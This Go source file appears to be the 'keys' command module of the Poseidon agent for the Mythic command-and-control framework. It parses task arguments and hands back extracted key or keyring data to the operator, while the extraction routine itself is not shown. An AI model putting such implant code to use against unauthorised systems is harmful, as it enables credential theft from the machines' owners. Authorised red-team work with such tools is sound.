package keys

import (
	// Standard
	"encoding/json"

	// Poseidon

	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils/structs"
)

// KeyInformation - interface for key data
type KeyInformation interface {
	KeyType() string
	Data() []byte
}

// Options - options for key data command
type Arguments struct {
	Command  string
	Keyword  string
	Typename string
}

func (e *Arguments) UnmarshalJSON(data []byte) error {
	alias := map[string]interface{}{}
	err := json.Unmarshal(data, &alias)
	if err != nil {
		return err
	}
	if v, ok := alias["command"]; ok {
		e.Command = v.(string)
	}
	if v, ok := alias["keyword"]; ok {
		e.Keyword = v.(string)
	}
	if v, ok := alias["typename"]; ok {
		e.Typename = v.(string)
	}
	return nil
}

// Run - extract key data
func Run(task structs.Task) {
	//Check if the types are available
	msg := task.NewResponse()
	opts := Arguments{}
	err := json.Unmarshal([]byte(task.Params), &opts)

	if err != nil {
		msg.UserOutput = err.Error()
		msg.Completed = true
		msg.Status = "error"
		task.Job.SendResponses <- msg
		return
	}

	res, err := getkeydata(opts)
	if err != nil {
		msg.UserOutput = err.Error()
		msg.Completed = true
		msg.Status = "error"
		task.Job.SendResponses <- msg
		return
	}

	msg.Completed = true
	msg.UserOutput = string(res.Data())
	task.Job.SendResponses <- msg
	return
}
